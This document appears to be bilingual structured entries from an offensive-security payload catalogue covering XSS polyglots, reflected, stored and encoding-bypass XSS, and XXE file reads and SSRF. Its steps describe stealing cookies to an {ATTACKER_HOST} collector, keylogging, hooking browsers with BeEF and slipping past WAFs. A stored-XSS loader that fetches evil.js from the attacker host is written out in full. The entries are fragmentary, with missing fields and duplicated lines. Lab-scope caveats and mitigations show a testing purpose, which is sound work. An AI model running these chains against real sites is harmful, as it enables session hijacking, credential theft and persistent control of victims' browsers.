name.zh: XSS Polyglot 分上下文速查集
name.en: XSS Polyglot Quick Set by Context

description.zh: 覆盖跨上下文通用的 Polyglot XSS 载荷：从经典与短格式 Polyglot，到属性注入与 URL 参数形态，再到高级组合变体，用于在未知输出上下文中一次投递、多点命中注入面。
description.en: Covers context-agnostic Polyglot XSS payloads: from classic and short-form polyglots through attribute-injection and URL-parameter forms to advanced composite variants, hitting the injection surface across multiple contexts with a single delivery.

overview.zh: 覆盖跨上下文通用的 Polyglot XSS 载荷：经典全上下文、短格式、属性注入与 URL 参数形态四类，用于在未知输出上下文中一次投递、多点命中注入面。适用于快速确认输入位可达的解析上下文范围。
overview.en: Covers cross-context Polyglot XSS payloads in four forms: classic full-context, short format, attribute injection, and URL-parameter shape, delivering once to hit multiple injection surfaces in unknown output contexts. Suitable for quickly mapping which parsing contexts an input position can reach.

vulnerability.zh: 根因是同一输入位可能同时进入 HTML、属性、脚本与 URL 多种解析上下文，而过滤器只按单一上下文假设处理；Polyglot 载荷借助各上下文共享的语法形态在多处同时形成可执行结构。
vulnerability.en: The root cause is a single input position potentially entering HTML, attribute, script, and URL parsing contexts simultaneously while filters assume a single context; Polyglot payloads leverage syntax shapes shared across contexts to form executable structures in several places at once.

exploitation.zh: 按 Payload 列表顺序使用：第 1 步提交经典全上下文 Polyglot，任一上下文（HTML/属性/脚本/URL）触发执行即确认该输入位多上下文可达；第 2 步短版本验证闭合既有标签后的执行；第 3 步属性注入形态以悬停/聚焦/点击触发；第 4 步 URL 参数形态以导航或脚本执行确认。命中后按命中的具体上下文转到对应专项条目细化。WAF 变体区提供高级 Polyglot 形态。
exploitation.en: Use in Payload list order: step 1 submits the classic full-context Polyglot; execution in any context (HTML/attribute/script/URL) confirms the input position reaches multiple contexts. Step 2 verifies the short form executing after closing the existing tag; step 3 triggers the attribute-injection form via hover/focus/click; step 4 confirms the URL-parameter form via navigation or script execution. After a hit, move to the dedicated entry for the specific context hit. The WAF section provides advanced Polyglot forms.

mitigation.zh:
按最终输出上下文分别编码，模板层固定标签结构避免属性逃逸，并以 nonce CSP 限制内联执行：
      String h = Encode.forHtml(input);          // HTML 文本
      String a = Encode.forHtmlAttribute(input); // 属性上下文
      String j = Encode.forJavaScript(input);    // 脚本块
      # Nginx 响应头
      add_header Content-Security-Policy "default-src 'self'; script-src 'self' 'nonce-$n'; object-src 'none'" always;
  修复后重放各 Polyglot 载荷，在所有上下文中保持不可执行且 DOM 快照复核无突变。
mitigation.en: Encode per final output context, pin tag structures at the template layer to avoid attribute escape, and restrict inline execution via CSP; after the fix, replayed Polyglots must stay non-executable in every context, verified with DOM snapshots for mutations.

title.zh: 经典 polyglot 一发多上下文
title.en: Cover many contexts with one classic polyglot

description.zh: 提交经典大杂烩载荷，同时闭合属性、注释、标签与事件多种语法，无论落点在哪个上下文都有分支生效弹出执行。
description.en: Fire the classic kitchen-sink payload closing attributes, comments, tags and events at once; whichever context it lands in, a branch fires.

title.en: Probe fast with a short polyglot

description.zh: 用短闭合链载荷快速试探，先关闭 script、style、textarea 等常见包裹再注入新标签，命中包裹形态即直接执行。
description.en: Use the short closure chain to snap shut script, style and textarea wrappers before injecting a fresh tag that executes on hit.

title.zh: 属性上下文 polyglot 注入

description.zh: 在属性值上下文中先以引号闭合原属性，注入 onmouseover/onfocus 等事件属性并补一个占位属性维持引号配对，悬停、聚焦或点击时触发执行，确认属性上下文可控。
description.en: When the sink is an attribute value, submit onmouseover/autofocus combos that keep quotes balanced and append a new attribute.

description.zh: 参数落进链接地址时用伪协议加注释后缀伪装正常链接，data URI 承载整页脚本，受害者点击链接即执行代码。
description.en: For href-bound parameters, prefix javascript: with a comment-disguised URL or carry a full page via data URI that runs on click.

description.zh: 被部分过滤时改用高级 polyglot，先闭合注释与标签再注入 svg 事件，多重语法兜底显著提高单次命中执行概率。
description.en: Under partial filtering use the advanced polyglot closing comments and tags before an svg event, maximizing single-shot odds.

review.rationale: v2.0.2 数据治理：描述/opsec/前置条件差异化重写

prerequisites.zh: 确认 XSS 多上下文输入边界 的目标、账号、数据、组件版本和停止条件均属于可回滚的授权实验范围。
prerequisites.en: Confirm that the target, accounts, data, component version, and stop conditions for XSS Multi-Context Input Boundary are inside a reversible authorized lab scope.

prerequisites.zh: 准备正常输入、唯一标记、服务端日志和阴性对照；禁止扩展到非实验资产、真实凭据或不可回滚状态。
prerequisites.en: Prepare normal input, a unique marker, server logs, and a negative control; do not expand to non-lab assets, real credentials, or irreversible state.

analysis.zh: XSS 多上下文输入边界只有在唯一输入、最终解析或授权结果、服务端日志和可观察影响相互一致时才能确认。单一状态码、超时、错误文本、客户端显示或工具猜测只应作为线索，必须保留阴性对照和版本条件。
analysis.en: XSS Multi-Context Input Boundary is confirmed only when the unique input, final parsing or authorization result, server-side logs, and observable impact agree. A status code, timeout, error string, client display, or tool guess is only a lead; retain a negative control and exact version prerequisites.

opsecTips.zh: Polyglot 一次投递多点命中——只在实验页面投递；命中位置清单在报告中完整记录。
opsecTips.en: Polyglots hit multiple contexts from one delivery — deploy them only on lab pages and record the full hit-position list in the report.

opsecTips.zh: 出现真实凭据、非实验数据、不可逆写入或非授权连接时立即停止并清理夹具。
opsecTips.en: Stop immediately and clean up the fixture on real credentials, non-lab data, irreversible writes, or unauthorized connections.

description.zh: 提交紧凑高级 Polyglot；触发执行即确认该形态以更短长度覆盖多上下文。
description.en: Submit the compact advanced polyglot; execution confirms this form covers multiple contexts in fewer bytes.

description.zh: 绕过长 payload 长度限制：保留闭合能力缩短长度。判据：多上下文仍执行。
description.en: Shorter payload keeps multi-context closure. Success: executes across contexts.

description.zh: 绕过明文引号/尖括号检测：全量编码。判据：解码后执行。
description.en: Fully encoded form avoids raw quote/bracket rules. Success: executes after decoding.

description.zh: 适配属性值上下文：闭合单引号直接注入事件。判据：聚焦触发。
description.en: Tailored for attribute contexts. Success: fires on focus.

description.zh: 适配双引号属性上下文。判据：悬停触发。
description.en: Tailored for double-quoted attribute contexts. Success: fires on hover.

title.zh: 多上下文通用 Polyglot 对

description.zh: 两条完整多上下文 Polyglot 原文直提（引号/标签/注释多断点闭合，marquee 与 plaintext 上下文切换，自引用 eval 载荷，末段请求 {ATTACKER_HOST}/x.jpg）；isindex 行已删除——HTML5 已移除该元素，现代浏览器不解析。判据：任一解析上下文触发 confirm/prompt 弹窗，或 {ATTACKER_HOST} 收到 x.jpg 请求。
description.en: Two complete multi-context polyglots submitted verbatim (quote/tag/comment breakouts, marquee and plaintext context switches, a self-referencing eval payload, and a closing request to {ATTACKER_HOST}/x.jpg); the isindex row is removed since HTML5 dropped the element and modern browsers never parse it. Success: any context fires confirm/prompt, or {ATTACKER_HOST} receives the x.jpg request.

description.zh: 提交经典全上下文 Polyglot；任一解析上下文（HTML/属性/脚本/URL）触发执行即确认该输入位多上下文可达。
description.en: Submit the classic multi-context polyglot; execution in any parsing context (HTML/attribute/script/URL) confirms multi-context reachability from that input position.

explanation.en: Describes how the value segment "jaVasCript:" participates in this validation command.

explanation.zh: 注释和模板字符串混淆

title.en: Validation step 2 for XSS Multi-Context Input Boundary

description.zh: 提交短版本 Polyglot；闭合既有标签后执行即确认短载荷有效性。
description.en: Submit the short polyglot; execution after closing existing tags confirms the compact payload works.

description.zh: 属性注入 Polyglot 提交；悬停/聚焦/点击触发执行即确认属性上下文可控。
description.en: Submit attribute-injection polyglots; execution on hover/focus/click confirms controllable attribute context.

description.zh: URL 参数 Polyglot 提交；导航或脚本执行即确认 URL 上下文可控。
description.en: Submit URL-parameter polyglots; navigation or script execution confirms controllable URL context.

name.zh: 反射型 XSS 检测与利用

description.zh: 覆盖反射型 XSS 的基础载荷、大小写变体与数据外带形态，确认输入进入 HTML 输出点。
description.en: Cover reflected XSS basics, case variants, and exfiltration shapes to confirm input reaches an HTML output sink.

overview.zh: 覆盖反射型 XSS 从输出边界探测到利用链的完整流程：基础脚本与事件载荷确认反射点可控，大小写与标签变形测试过滤强度，再以 Image/fetch/location 外传 Cookie、注入按键监听完成会话窃取链。适用于参数回显进入 HTML 响应的场景。
overview.en: Covers the full reflected XSS flow from output-boundary probing to exploitation chains: basic script and event payloads confirm a controllable reflection point, case and tag mutations test filter strength, then Image/fetch/location exfiltrates cookies and an injected key listener completes the session-theft chain. Suitable when parameters echo into HTML responses.

vulnerability.zh: 根因是用户输入未经上下文编码直接进入响应的 HTML、属性或脚本位置，浏览器把反射内容解析为可执行代码；黑名单过滤与字符串替换无法覆盖全部标签与事件形态，反射点因此可执行。
vulnerability.en: The root cause is user input entering HTML, attribute, or script positions of the response without context-appropriate encoding, so the browser parses reflected content as executable code; blacklists and string replacement cannot cover every tag and event form, leaving the reflection point executable.

exploitation.zh: 按 Payload 列表顺序使用：第 1 步提交基础脚本与事件载荷，alert 弹出或载荷原样出现即确认反射点可控；第 2-3 步逐行测试事件处理器与大小写/标签变形定位过滤缺口；确认后用第 4 步把 document.cookie 经 Image/fetch/location 发往 {ATTACKER_HOST} 收集端，第 5 步注入按键监听验证键盘记录链。被 WAF 拦截时改用 HTML 实体、Unicode 编码与双写绕过变体。
exploitation.en: Use in Payload list order: step 1 submits basic script and event payloads; an alert or verbatim payload echo confirms a controllable reflection point. Steps 2-3 test event handlers and case/tag mutations line by line to locate filter gaps. Once confirmed, step 4 sends document.cookie to the {ATTACKER_HOST} collector via Image/fetch/location, and step 5 injects a key listener to verify the keylogging chain. When blocked by a WAF, switch to HTML-entity, Unicode-encoding, and double-write variants.

mitigation.en: Use framework auto-encoding per output context, route rich text through a maintained sanitizer, deploy CSP, and set HttpOnly/Secure/SameSite on cookies; after the fix, replaying all payloads must yield no script execution and the collector must receive nothing.

title.zh: 提交基础标签探测输出点

description.zh: 在参数中提交 script、img、svg 三类基础标签，观察返回页面是否原样执行或弹窗，确认反射输出位置与转义情况。
description.en: Submit script, img and svg tags in the parameter and watch for execution or alerts to map the reflected sink and its escaping.

title.zh: 事件处理器载荷绕过标签过滤
title.en: Use event handlers when tags are filtered

description.zh: script 标签被过滤时改用 onerror、onload、autofocus 等事件属性触发，图片加载失败即执行代码，弹窗确认通道保持。
description.en: If the script tag is filtered, pivot to onerror/onload/autofocus attributes so a broken image load still fires the payload.

title.en: Punch through the WAF with encoding and double-write

description.zh: 拦截时改用 HTML 实体编码、Unicode 转义或双写标签变体，破坏特征匹配后载荷仍被浏览器解码执行成功。
description.en: When blocked, switch to HTML entities, Unicode escapes or double-written tags; the browser still decodes and runs the payload.

title.zh: 窃取 Cookie 完成利用
title.en: Steal cookies to finish the exploit

description.zh: 执行点确认后注入外带脚本，把 document.cookie 拼进请求发往控制端，收到 Cookie 即可冒充受害者会话操作账户。
description.en: With execution confirmed, inject a beacon that ships document.cookie to the collector; receiving it enables session impersonation.

review.rationale: v2.0.2 数据治理：描述/opsec/前置条件差异化重写

A status code, timeout, error string, client display, or tool guess is only a lead; retain a negative control and exact version prerequisites.

opsecTips.zh: 载荷只携带唯一 marker 并指向实验收集端，不引用外部脚本资源；共享实例上避开真实用户可见的注入位置。
opsecTips.en: Keep payloads to a unique marker pointing at the lab collector, reference no third-party script resources, and avoid injection points visible to real users on shared instances.

opsecTips.zh: 出现真实凭据、非实验数据、不可逆写入或非授权连接时立即停止并清理夹具。
opsecTips.en: Stop immediately and clean up the fixture on real credentials, non-lab data, irreversible writes, or unauthorized connections.

description.zh: 以 HTML 实体编码 alert 提交；解码后仍执行即确认实体编码可绕过关键字过滤。
description.en: Submit entity-encoded alert payloads; execution after decoding confirms HTML-entity encoding bypasses keyword filtering.

description.zh: 以 \u0061 转义书写 alert 提交；JS 解码后仍执行即确认 Unicode 转义可绕过关键字过滤。
description.en: Write alert with \u0061 escapes; execution after JS decoding confirms Unicode escapes bypass keyword filtering.

description.zh: 双写标签提交；过滤器删除内层后拼回有效标签并执行即确认关键字删除过滤可绕过。
description.en: Submit double-written tags; the filter deleting the inner tag and the remainder reassembling into a working tag confirms keyword-deletion filtering is bypassable.

explanation.zh: 双写嵌套script标签：内层<script>被过滤删除后，剩余字符重新拼出完整标签
explanation.en: Nested script tags reassemble after inner tag is stripped

explanation.zh: 弹窗代码与双写的闭合标签，过滤后还原为</script>
explanation.en: Alert code and doubled closing tag

explanation.zh: img双写变体：删除内层img后拼出标签并由onerror触发
explanation.en: Doubled img tag reassembles and fires onerror

description.zh: 以注释插入拆分关键字与属性提交；前两行在 JS 空白位插 /**/ 是有效形态，仍触发执行即确认注释混淆可绕过检测。更正：HTML 解析器不允许注释拆分属性名，on<!--test-->load 会解析为普通属性、事件不注册、永不触发，该死行已从语法分解中移除。
description.en: Splits keywords and attributes with inserted comments; the first two rows interleave /**/ at JS whitespace positions and stay valid, so execution still firing confirms comment obfuscation evades detection. Correction: HTML parsing never lets a comment split an attribute name - on<!--test-->load parses as a plain attribute with no handler ever registered, and that dead row is removed from the breakdown.

explanation.zh: script内用/**/注释分隔alert，绕过连续关键字匹配
explanation.en: Comments interleaved with alert to evade keyword matching

explanation.zh: img标签：注释插入在属性与事件之间打乱特征
explanation.en: Comment inserted between attribute and event handler

title.en: Validation step 1 for Reflected XSS Output Boundary

description.zh: 提交基础脚本与事件载荷探测输出边界；alert 弹出或载荷原样出现在响应中即确认反射点可控。
description.en: Submit basic script and event payloads to probe the output boundary; an alert firing or the payload reflected verbatim confirms a controllable reflection point.

title.en: Validation step 2 for Reflected XSS Output Boundary

description.zh: 逐行测试不同标签上的事件处理器；任一行触发 alert 即确认对应事件形式未被过滤。
description.en: Test event handlers across different tags line by line; any line firing an alert confirms that event form is unfiltered.

title.en: Validation step 3 for Reflected XSS Output Boundary

description.zh: 以大小写混淆与标签变形提交；仍触发执行即确认过滤按大小写敏感的字面形态匹配，未覆盖大小写变体与标签变形。
description.en: Submit case-obfuscated and tag-mutated payloads; execution still firing confirms the filter is insensitive to case and tag form.

description.zh: 以 Image/fetch/location 三种方式把 document.cookie 发往收集端；收集端收到 c 参数中的 cookie 即确认会话可窃取。{ATTACKER_HOST} 渲染为自有收集服务器。
description.en: Send document.cookie via Image, fetch, and location to the collector; cookies arriving in the c parameter confirm session theft. {ATTACKER_HOST} renders to your collection server.

explanation.zh: 创建图片对象发送请求

description.zh: 注入按键监听把击键发往收集端；收集端按 key 参数收到击键流即确认键盘记录链可用。{ATTACKER_HOST} 渲染为自有收集服务器。
description.en: Inject a keypress listener forwarding keystrokes to the collector; the keystroke stream arriving under the key parameter confirms the keylogger chain. {ATTACKER_HOST} renders to your collection server.

name.zh: 存储型 XSS 注入与持久化利用

description.zh: 覆盖存储型 XSS 的持久化注入与控制验证：从存储点直注与标签闭合，到隐蔽载荷与持久化控制，再到 BeEF 钩子注入，并附 SVG 与 MathML 标签绕过，用于确认恶意脚本能否长期驻留并触发。
description.en: Covers stored XSS persistence injection and control validation: from direct injection and tag closure at storage points through stealth payloads and persistent control to BeEF hook injection, with SVG and MathML tag bypasses, to confirm whether malicious scripts can persist and fire long-term.

overview.zh: 覆盖存储型 XSS 的持久化注入验证：存储点直注与属性闭合确认持久化执行，隐蔽载荷绕过目视检查，动态脚本加载实现持久化控制，并验证 BeEF 钩子的上线链路。适用于评论、资料等存储后被多用户查看的字段。
overview.en: Covers persistent injection verification for stored XSS: direct injection and attribute closure at the storage point to confirm persistent execution, hidden payloads bypassing visual inspection, dynamic script loading for persistent control, and the BeEF hook check-in chain. Suitable for fields stored and later viewed by many users, such as comments and profiles.

vulnerability.zh: 根因是用户输入被存储后未按 HTML 上下文编码即输出到查看页，恶意标签随数据持久化并对每个查看者执行；存储路径的输出编码缺失使影响从单次反射放大为持久控制。
vulnerability.en: The root cause is stored user input echoed to viewing pages without HTML-context encoding, so malicious tags persist with the data and execute for every viewer; missing output encoding on the storage path amplifies a one-shot reflection into persistent control.

exploitation.zh: 按 Payload 列表顺序使用：第 1 步在存储点直注 script 并用 "> 闭合既有属性，重新查看页面执行即确认持久化；第 2 步以隐藏样式事件载荷验证隐蔽形态可绕过目视检查；第 3 步注入指向 {ATTACKER_HOST} 的一次性动态脚本实现持久化控制；第 4 步注入 {BEEF_HOST} 的 hook.js，BeEF 控制台出现浏览器上线即确认钩取链路。被 WAF 拦截时改用 SVG/MathML 标签绕过。
exploitation.en: Use in Payload list order: step 1 injects a script tag directly at the storage point and closes the existing attribute with ">; execution on revisiting the page confirms persistence. Step 2 verifies hidden-styled event payloads bypass visual inspection; step 3 injects a one-time dynamic script pointing at {ATTACKER_HOST} for persistent control; step 4 injects hook.js from {BEEF_HOST}, with the browser appearing in the BeEF console confirming the hooking chain. When blocked by a WAF, switch to SVG/MathML tag variants.

mitigation.en: Encode stored output by context, run rich text through a sanitizer allowlist, restrict script-src via CSP, and validate hazardous fields before persistence; after the fix, replayed payloads must render verbatim without execution on every viewing page, including admin and export views.

title.en: Inject and close tags at the storage point

description.zh: 在个人简介、评论等存储字段提交 script 标签与引号闭合变体，提交后查看展示页，确认载荷是否原样入库并执行。
description.en: Submit script tags and quote-closure variants in profile or comment fields, then view the render page to confirm stored execution.

title.zh: 隐蔽载荷规避界面暴露

description.zh: 直接弹窗易被用户察觉并下线处理，改用隐藏样式的事件标签触发，页面视觉无异常但代码照常执行，显著延长驻留时间。
description.en: Swap alerts for hidden-styled event tags so code runs without visual anomalies, extending the payload's dwell time.

title.zh: 注入持久化远程脚本加载

description.zh: 存储一段带去重判断的脚本，页面首次渲染即动态加载控制端远程脚本，后续攻击功能远程可控实现一次注入长期驻留。
description.en: Store a guard-checked script that dynamically loads evil.js on first render, keeping remote control after a single injection.

attackChain.payload:
<script>
if(!window.xss_loaded){
  window.xss_loaded=true;
  var s=document.createElement("script");
  s.src="http://{ATTACKER_HOST}/evil.js";
  document.body.appendChild(s);
}
</script>

title.zh: SVG 与 Math 标签变体穿透过滤
title.en: Use SVG/Math variants to defeat filters

description.zh: script 被清洗时改用 SVG 命名空间的 animate、set 事件标签触发，maction 等冷门标签同样执行代码绕过过滤。
description.en: When scripts are sanitized, fire payloads from SVG animate/set tags or obscure MathML elements that still execute code.

opsecTips.zh: 存储型载荷会驻留并被其他用户触发——验证后立即删除存储条目；BeEF 钩子只对实验浏览器会话生效并在结束后关闭。
opsecTips.en: Stored payloads persist and fire on other users — delete stored entries immediately after verification, and confine BeEF hooks to lab browser sessions, closing them when done.

opsecTips.zh: 出现真实凭据、非实验数据、不可逆写入或非授权连接时立即停止并清理夹具。
opsecTips.en: Stop immediately and clean up the fixture on real credentials, non-lab data, irreversible writes, or unauthorized connections.

description.zh: 以 SVG script/animate/set 标签提交；仍触发执行即确认 SVG 标签绕过有效。
description.en: Submit SVG script/animate/set tags; execution still firing confirms the SVG-tag bypass.

explanation.zh: SVG set标签的onbegin事件触发弹窗

title.en: Direct stored-point injection and tag closure

description.zh: 在存储点直接注入 script 标签，并用 "> 闭合既有属性后注入，验证内容是否持久化并在查看页执行。

description.zh: 以隐藏样式的事件载荷注入存储点；查看页静默触发执行即确认隐蔽形态可绕过目视检查。
description.en: Inject event payloads with hidden styling into the storage point; silent execution on the viewing page confirms stealthy forms evade visual inspection.

<script>

  window.xss_loaded=true;
  var s=document.createElement("script");
  s.src="http://{ATTACKER_HOST}/evil.js";

description.zh: 注入带一次性标记的动态脚本加载实现持久化控制；外部脚本被拉取并执行（收集端可见请求、仅加载一次）即确认存储型 XSS 可持久化控制。{ATTACKER_HOST} 渲染为自有脚本服务器。
description.en: Inject a one-shot-flagged dynamic script load for persistent control; the external script being fetched and executed (request visible at your server, loaded once) confirms persistent stored-XSS control. {ATTACKER_HOST} renders to your script server.

description.zh: 注入指向自建 BeEF 服务器的 hook.js（src 直接引用与动态 createElement 两种写法）；BeEF 控制台出现该浏览器上线即确认钩取控制链路。{BEEF_HOST} 渲染为隔离实验 BeEF 主机。
description.en: Inject hook.js from your BeEF server (direct src and dynamic createElement variants); the browser appearing online in the BeEF console confirms the hooked control chain. {BEEF_HOST} renders to the isolated lab BeEF host.

explanation.zh: 直接引用 BeEF 钩子脚本
动态创建脚本节点加载钩子

name.zh: Unicode 与字符编码 XSS 绕过

description.zh: 以 Unicode 转义、HTML 实体、全角字符与 UTF-7 编码构造同义载荷，验证规范化层差异。
description.en: Build equivalent payloads via Unicode escapes, HTML entities, fullwidth characters, and UTF-7 to probe normalization differences.

overview.zh: 覆盖字符编码维度的 XSS 绕过验证：JS 的 \u/\x/\u{} 转义书写关键字、HTML 实体编码事件载荷、全角字符规范化前提与 UTF-7 历史编码前提。用于确认解码链不一致造成的过滤缺口及其成立前提。
overview.en: Covers XSS bypass verification across the character-encoding dimension: writing keywords with JS \u/\x/\u{} escapes, HTML-entity-encoded event payloads, fullwidth-character normalization preconditions, and UTF-7 legacy-encoding preconditions. Used to identify filtering gaps caused by inconsistent decode chains and their preconditions.

vulnerability.zh: 根因是过滤层与浏览器/JS 引擎对同一字节序列的解码结果不一致：JS 转义与 HTML 实体在最终执行前才还原，全角与 UTF-7 仅在授权链路执行规范化或显式声明时才形成标签；按字面匹配的过滤因此被绕过。
vulnerability.en: The root cause is decode divergence between the filter and the browser/JS engine over the same byte sequence: JS escapes and HTML entities restore only before final execution, while fullwidth and UTF-7 form tags only when the authorized chain normalizes or explicitly declares them; literal-matching filters are therefore bypassed.

exploitation.zh: 按 Payload 列表顺序使用：第 1 步以 \u/\x/\u{} 转义书写 alert，JS 解码后执行即确认转义绕过关键字检测；第 2 步以十进制/十六进制 HTML 实体提交事件载荷，解码后执行即确认实体绕过；第 3、4 步为前提验证——全角与 UTF-7 样例只在授权链路先执行 NFKC 规范化或显式声明 UTF-7 时才可能形成标签，现代 UTF-8 页面不会直接解码。被 WAF 拦截时参考混合编码变体。
exploitation.en: Use in Payload list order: step 1 writes alert with \u/\x/\u{} escapes; execution after JS decoding confirms escape-based keyword bypass. Step 2 submits event payloads as decimal/hex HTML entities; execution after decoding confirms entity bypass. Steps 3 and 4 are precondition checks — fullwidth and UTF-7 samples form tags only when the authorized chain applies NFKC normalization or explicitly declares UTF-7; modern UTF-8 pages never decode them directly. When blocked by a WAF, see the mixed-encoding variants.

mitigation.en: Encode output by context, unify charset to UTF-8, never let converted encodings re-enter HTML context, and match filters on decoded semantics; after the fix, replayed escape, entity, and encoding variants must yield no executable content.

description.zh: 用多种 Unicode 转义形式书写函数首字母，过滤器匹配不到完整函数名，脚本引擎解码后照常执行载荷代码。
description.en: Spell alert with \u0061, \x61 or \u{61} escapes so filters miss the function name while the JS engine still decodes and runs it.

description.zh: 事件属性值改用十进制与十六进制实体编码函数名，检测设备只看到数字与井号，浏览器解码后事件处理器正常调用执行。
description.en: Encode handler bodies as decimal/hex entities; the WAF sees digits and ampersands while the browser decodes and invokes the handler.

title.zh: 全角字符利用规范化差异

description.zh: 提交全角尖括号载荷，若服务端或前端做 Unicode 规范化还原为半角，过滤发生在规范化之前即被绕过，标签重新生效执行。
description.en: Submit fullwidth angle brackets; if a normalization pass folds them back to ASCII after filtering, the tags reanimate and execute.

title.zh: 混合编码穿透多层过滤
title.en: Combine encodings to pass layered filters

description.zh: 同一载荷混排 JS 转义、HTML 实体与反引号调用，各层过滤视角不同均放行，最终执行环境完成解码触发执行。
description.en: Blend JS escapes, HTML entities and backtick calls in one payload so each filtering layer approves and the runtime still executes it.

review.rationale: v2.0.2 数据治理：描述/opsec/前置条件差异化重写

prerequisites.en: Confirm that the target, accounts, data, component version, and stop conditions for Unicode and Character-Encoding XSS Boundary are inside a reversible authorized lab scope.

prerequisites.zh: 准备正常输入、唯一标记、服务端日志和阴性对照；禁止扩展到非实验资产、真实凭据或不可回滚状态。
prerequisites.en: Prepare normal input, a unique marker, server logs, and a negative control; do not expand to non-lab assets, real credentials, or irreversible state.

analysis.en: Unicode and Character-Encoding XSS Boundary is confirmed only when the unique input, final parsing or authorization result, server-side logs, and observable impact agree. A status code, timeout, error string, client display, or tool guess is only a lead; retain a negative control and exact version prerequisites.

opsecTips.zh: Unicode 变体会冲击数据库与日志的编码处理——载荷不含真实敏感词形态；变体批量投递限速。
opsecTips.en: Unicode variants can stress database and log encoders — keep payloads free of realistic sensitive forms and throttle batch delivery.

opsecTips.zh: 出现真实凭据、非实验数据、不可逆写入或非授权连接时立即停止并清理夹具。
opsecTips.en: Stop immediately and clean up the fixture on real credentials, non-lab data, irreversible writes, or unauthorized connections.

description.zh: 混合实体与 Unicode 转义及反引号调用提交；解码链仍还原执行即确认混合编码绕过有效。
description.en: Mix entities, Unicode escapes, and backtick invocation; execution after the full decode chain confirms the mixed-encoding bypass.

title.zh: 非法过长 UTF-8 阴性样例

description.en: Replace the unencoded ordinary tag with an actual overlong UTF-8 byte vector. Use it in an authorized lab to verify that the decoder rejects invalid sequences, not as a universal modern-browser bypass.

description.zh: 绕过半角标签规则且换 prompt 输出。判据：规范化后执行。
description.en: Fullwidth brackets with prompt output. Success: executes after normalization.

description.zh: confirm 输出验证解码链路。判据：确认框出现。

description.zh: 混合全角括号与编码点干扰规范化。判据：异常解析执行。

description.zh: 框架方式执行。判据：弹窗触发。
description.en: Fullwidth iframe form. Success: alert fires.

description.zh: 以全角括号构造标签提交；仅当链路先执行 NFKC 等规范化再输出 HTML 时执行，弹出即确认规范化差异可利用；直接原样输出时应为阴性。

description.zh: 以 \u/\x/\u{} 转义书写 alert 提交；JS 解码后执行即确认转义可绕过关键字检测。

description.en: Retain the full-width sample while making clear that it can form markup only when an authorized lab pipeline first performs normalization such as NFKC and then writes the result into HTML; browsers do not directly parse full-width brackets as tags.

description.zh: 保留 UTF-7 字节样例，并要求在授权的历史兼容夹具中显式声明 UTF-7；现代 UTF-8 页面或浏览器不会把该文本自动解码为脚本。
description.en: Retain the UTF-7 byte sample and require an explicitly declared UTF-7 legacy-compatibility fixture; a modern UTF-8 page or browser does not automatically decode this text into script.

name.zh: XML 外部实体 OAST 验证

description.zh: 覆盖 XML 外部实体注入的基础验证：从实体探测与本地文件读取，到经 filter 包装器读取 PHP 源码，再到实体发起 SSRF，并附参数实体与 UTF-16 编码绕过变体。
description.en: Covers foundational validation of XML external entity injection: from entity detection and local file reads through PHP source reads via the filter wrapper to SSRF launched from entities, with parameter-entity and UTF-16 encoding bypass variants.

subCategory.zh: 基础实体注入与过滤差异

overview.zh: 覆盖 XML 外部实体注入的基础验证：file:// 实体读取 Linux/Windows 文件、php://filter Base64 读取 PHP 源码、实体发起云元数据 SSRF，并附参数实体与 UTF-16 编码变体。适用于解析用户提交 XML 且未禁用 DTD 的入口。
overview.en: Covers foundational verification of XML external entity injection: file:// entities reading Linux/Windows files, php://filter Base64 reading of PHP source, entity-driven cloud-metadata SSRF, plus parameter-entity and UTF-16 encoding variants. Suitable for entry points parsing user XML with DTDs not disabled.

vulnerability.zh: 根因是解析不可信 XML 时允许 DTD 与外部实体加载，实体 SYSTEM 标识符可指向本地文件或内网地址；解析器未按安全预设配置（禁用外部实体与 DTD）时，文件读取与 SSRF 随之成立。
vulnerability.en: The root cause is parsing untrusted XML with DTDs and external entities allowed: entity SYSTEM identifiers can point at local files or intranet addresses. Without a secure parser preset disabling external entities and DTDs, file reads and SSRF follow.

exploitation.zh: 按 Payload 列表顺序使用：第 1 步声明 file:// 外部实体读取 {FILE_PATH}，响应出现文件内容即确认实体解析开启；第 2 步读 win.ini 验证 Windows 平台；第 3 步用 php://filter Base64 读 index.php，解码得到源码即确认 wrapper 可用；第 4 步以实体请求隔离模拟的元数据端点验证 SSRF。被 WAF 拦截时改用参数实体或 UTF-16 编码变体。
exploitation.en: Use in Payload list order: step 1 declares a file:// external entity reading {FILE_PATH}; file content in the response confirms entity parsing is on. Step 2 reads win.ini for the Windows platform; step 3 reads index.php via php://filter Base64, with decoded source confirming the wrapper works; step 4 requests an isolated, simulated metadata endpoint to verify SSRF. When blocked by a WAF, switch to parameter-entity or UTF-16 encoding variants.

mitigation.en: Disable DTDs, external entities, and XInclude on all XML parsing paths (e.g., libxml2 without NOENT, Java disallow-doctype-decl) and restrict outbound networking; after the fix, replayed entity payloads must report DTD-forbidden errors with no file content echoed.

description.zh: 核对 XML 外部实体 OAST 验证 的测试对象、账号、数据和停止条件；当前首要前置条件是“确认 XML 外部实体 OAST 验证 的目标、账号、数据、组件版本和停止条件均属于可回滚的授权实验范围。”。
description.en: Confirm the target, account, data, and stop conditions for XML External-Entity OAST Validation, including the documented prerequisites.

description.zh: 使用正常输入记录请求、状态码、响应体、处理时间和服务端日志，为后续单变量对照提供可重复证据。
description.en: Record the normal request, status, body, timing, and server logs so later single-variable comparisons have repeatable evidence.

description.zh: 只替换 XML 外部实体 OAST 验证 对应的一个输入，对照命令说明观察解析、授权或执行差异，并排除缓存、重试和随机延迟等假阳性。
description.en: Change one input for XML External-Entity OAST Validation, observe the documented parsing, authorization, or execution difference, and exclude cache, retry, and random-delay false positives.

title.zh: 保存证据并执行修复回归

description.zh: 保存最小请求、响应和日志证据，按“所有 XML 解析路径禁用 DTD、外部实体与 XInclude（如 libxml2 不启用 NOENT、Java 设 disallow-doctype-decl），并限制出站网络；修复后重放实体载荷应报 DTD 禁止且无文件内容回显。”完成修复后，重放正常与异常基线，确认业务功能保留且安全差异消失。
description.en: Preserve the minimal request, response, and log evidence, apply the documented mitigation, and replay normal and abnormal baselines to confirm behavior remains available while the security difference disappears.

name.zh: 无回显 XXE 关联验证

description.zh: 覆盖无回显 XXE 的关联验证：从外部实体探测与参数实体声明，到参数实体把文件内容外带至攻击者端，并附 UTF-16LE 编码转换变体，用于在无输出场景确认实体注入与数据外带。
description.en: Covers correlation validation of blind XXE: from external-entity detection and parameter-entity declaration through parameter entities exfiltrating file contents to the attacker, with UTF-16LE encoding-conversion variants, confirming entity injection and data exfiltration in no-output scenarios.

